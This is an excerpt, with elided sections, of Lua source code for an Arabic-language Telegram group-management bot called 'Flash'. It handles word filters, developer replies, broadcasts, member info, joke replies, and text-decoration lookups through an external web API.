end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ❃∫ ارسل الكلمه الان")  
database:set(bot_id.."flash1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return flashe  end
if text then 
local test = database:get(bot_id.."flash1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."flash1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."flash1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."flash1:List:Filter"..msg.chat_id_,text)  
return flashe  end  
end
...
local list = database:smembers(bot_id.."flash1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."flash1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."flash1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."flash1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ❃∫ قائمة المنع \n𓇠——————F𝐥𝐚𝐬𝐡——————↠\n"
for k,v in pairs(list) do  
local flash_Msg = database:get(bot_id.."flash1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..flash_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'مسح كليشه المطور' and DevflashW(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ❃∫ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevflashW(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ❃∫ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'suorsflash')..')'..'\n ❃∫ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevflashW(msg) then  
...
if text == 'تعطيل الاذاعه' and DevflashW(msg) then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'فلاش').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'فلاش')
local flash_Msg = {
'عمغي 🥺💕.',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
...
send(msg.chat_id_, msg.id_,'['..flash_Msg[math.random(#flash_Msg)]..']') 
return flashe
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevflashW(msg) then 
...
if Can_or_NotCan(result.sender_user_id_,msg.chat_id_) ~= flashe then
...
if text == ("مسح ردود المطور") and DevflashW(msg) then 
...
if text == ("ردود المطور") and DevflashW(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ❃∫ قائمة ردود المطور \n𓇠——————F𝐥𝐚𝐬𝐡——————↠\n"
for k,v in pairs(list) do
...
if text == 'اضف رد للكل' and DevflashW(msg) then 
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'حذف رد للكل' and DevflashW(msg) then 
if AddChannel(msg.sender_user_id_) == flashe then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فلاش').." غادر" or text == 'غادر' then  
...
if text == 'تفعيل المغادره' and DevflashW(msg) then   
...
if text == 'تعطيل المغادره' and DevflashW(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'flash')..') '
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'suorsflash')..')'
local iduser = result.sender_user_id_
...
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= flashe then   
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, amir.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == flashe then
...
-- vardump(data) 
flashdx(msg.chat_id_, msg.id_, ' ❃∫ ايدي المجموعة » ( '..msg.chat_id_..' )\n ❃∫ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ❃∫ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ❃∫ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
if text == 'استعاده الاوامر' and DevflashW(msg) then
...
*❃م10 ◂ اوامر الاعضاء*
ٴ𓇠——————F𝐥𝐚𝐬𝐡——————↠ٴ
彡 .[F𝐥𝐚𝐬𝐡 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/suorsflash)➢ 
]]
...
zh = https.request('https://rudi-dev.tk/Amir1/flash.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n❃∫ قائمه الزخرفه \nٴ❃∫ٴ𓇠——————F𝐥𝐚𝐬𝐡——————↠ٴ❃∫○ٴ \n"
i = 0
...
send(msg.chat_id_, msg.id_, t..'ٴ❃∫ٴ𓇠——————F𝐥𝐚𝐬𝐡——————↠ٴ❃∫○ٴ\n❃∫ 彡 .[F𝐥𝐚𝐬𝐡 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/suorsflash)➢ ')
end
...
gk = https.request('https://rudi-dev.tk/Amir2/flash.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
...
ge = https.request('https://rudi-dev.tk/Amir3/flash.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فلاش')
...
function FunBot(extra, result, success) 
local Fun = {'الكبد مال اني ','يولي ماحبه ',' لٱ ايع ','بس لو الكفها اله اعضها 💔','ماخب معرصين اسف','اكلك ۿذﭑ يكلي احبكك لولا ﭑݩٺ شتكول  ','ئووووووووف اموت ع ربه ','ايععععععععع','بلعباس اعشكك','ماحب مخابيل','احبب ميدو وبس','لٱ ماحبه','بله هاي جهره تكلي تحبهه ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئلني احبهم لولا','افبس حبيبي هذا' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return flashe
...
------------------------------------------------------------------------
local flashAbot = database:get(bot_id.."flash1:Add:Filter:Rp2"..text..result.chat_id_)   
if flashAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= flashe then
send(msg.chat_id_,0," ❃∫ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ❃∫ ["..flashAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local flash1_Msg = database:get(bot_id.."flash1:Add:Filter:Rp2"..text..result.chat_id_)   
if flash1_Msg then    
send(msg.chat_id_, msg.id_," ❃∫ "..flash1_Msg)
